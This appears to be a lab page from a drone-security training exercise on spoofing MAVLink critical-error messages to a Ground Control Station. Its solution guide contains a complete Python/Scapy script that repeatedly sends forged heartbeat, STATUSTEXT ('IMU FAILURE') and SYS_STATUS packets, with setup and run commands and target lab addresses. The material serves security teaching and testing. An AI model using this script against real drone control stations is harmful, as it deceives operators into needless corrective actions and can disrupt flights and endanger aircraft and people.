title: Critical Error Spoofing
order: 3
description: Spoofing critical error messages to mislead the Ground Control Station (GCS) about the drone's status.
breadcrumb:
  - text: Attack Scenarios
    link: /attacks
  - text: Protocol Tampering
  - text: Critical Error Spoofing

sections:
  - title: Description
    content: |
      Critical error spoofing involves sending false critical error messages to the Ground 
      Control Station (GCS) to mislead it about the drone's status. This can cause the operator 
      to take unnecessary corrective actions, potentially disrupting the drone's mission.

  - title: Resources
    content:
      - text: MAVLink Protocol
        link: https://mavlink.io/en/
      - text: PyMAVLink Documentation
        link: https://mavlink.io/en/mavgen_python/

  - title: Solution Guide
    collapsible: true
    steps:
      - title: Step 1. Setup
        description: |
          Ensure you have Python and the necessary libraries installed:
          ```sudo apt-get update
          sudo apt-get install python3 python3-pip
          pip3 install pymavlink scapy
          ```

      - title: Step 2. Create the Script
        description: |
          Create a Python script named `critical-error-spoofing.py` and paste the following code:
          ```from pymavlink import mavutil
          from scapy.all import *
          import time
          import sys

          def create_heartbeat():
              """
              Create a MAVLink heartbeat message.
              """
              mav = mavutil.mavlink.MAVLink(None)
              mav.srcSystem = 1
              mav.srcComponent = 1

              heartbeat = mav.heartbeat_encode(
                  type=mavutil.mavlink.MAV_TYPE_QUADROTOR,
                  autopilot=mavutil.mavlink.MAV_AUTOPILOT_ARDUPILOTMEGA,
                  base_mode=mavutil.mavlink.MAV_MODE_FLAG_CUSTOM_MODE_ENABLED,
                  custom_mode=3,  # Custom mode to indicate flying (ArduCopter: GUIDED mode)
                  system_status=mavutil.mavlink.MAV_STATE_CRITICAL  # Indicate a critical state
              )
              
              return heartbeat.pack(mav)

          def create_statustext():
              """
              Create a MAVLink STATUSTEXT message indicating a critical error.
              """
              mav = mavutil.mavlink.MAVLink(None)
              mav.srcSystem = 1
              mav.srcComponent = 1

              statustext = mav.statustext_encode(
                  severity=mavutil.mavlink.MAV_SEVERITY_CRITICAL,
                  text="CRITICAL ERROR: IMU FAILURE".encode('utf-8')
              )
              
              return statustext.pack(mav)

          def create_sys_status():
              """
              Create a MAVLink SYS_STATUS message with critical error indicators.
              """
              mav = mavutil.mavlink.MAVLink(None)
              mav.srcSystem = 1
              mav.srcComponent = 1

              sys_status = mav.sys_status_encode(
                  onboard_control_sensors_present=0b11111111111111111111111111111111,  # All sensors present
                  onboard_control_sensors_enabled=0b11111111111111111111111111111111,  # All sensors enabled
                  onboard_control_sensors_health=0b00000000000000000000000000000000,  # All sensors failed
                  load=1000,  # System load (100%)
                  voltage_battery=0,  # Battery voltage (mV)
                  current_battery=0,  # Battery current (10 * mA)
                  battery_remaining=0,  # Remaining battery energy (0%)
                  drop_rate_comm=1000,  # Communication drop rate (% * 100)
                  errors_comm=100,  # Communication errors
                  errors_count1=100,  # First sensor error count
                  errors_count2=100,  # Second sensor error count
                  errors_count3=100,  # Third sensor error count
                  errors_count4=100   # Fourth sensor error count
              )

              return sys_status.pack(mav)

          def send_mavlink_packet(packet_data, target_ip, target_port):
              """
              Send a MAVLink packet using Scapy.
              """
              packet = IP(dst=target_ip) / UDP(dport=target_port) / Raw(load=packet_data)
              send(packet)

          if __name__ == "__main__":
              if len(sys.argv) != 2:
                  print("Usage: python critical_error_spoof.py <ip:port>")
                  sys.exit(1)

              target = sys.argv[1]
              target_ip, target_port = target.split(':')
              target_port = int(target_port)

              while True:
                  heartbeat_packet = create_heartbeat()
                  statustext_packet = create_statustext()
                  sys_status_packet = create_sys_status()

                  send_mavlink_packet(heartbeat_packet, target_ip, target_port)
                  send_mavlink_packet(statustext_packet, target_ip, target_port)
                  send_mavlink_packet(sys_status_packet, target_ip, target_port)
                  
                  print(f"Sent heartbeat, STATUSTEXT, and SYS_STATUS packets to {target_ip}:{target_port} indicating a critical error")

          ```

      - title: Step 3. Run the Script
        description: |
          Execute the script with sudo and the target GCS IP and port:
          ```sudo python critical-error-spoofing.py (GCS_IP:PORT)
          ```
          Replace `(GCS_IP:PORT)` with the actual IP address and port of the QGroundControl App using `10.13.0.6:14550` or the GCS (MAVProxy) using `192.168.13.14:14550`/`10.13.0.4:14550`

      - title: Step 4. Monitor the Effects
        description: |
          Observe the GCS to see the spoofed critical error messages being displayed. The GCS will show various critical errors, potentially causing the operator to take unnecessary corrective actions.
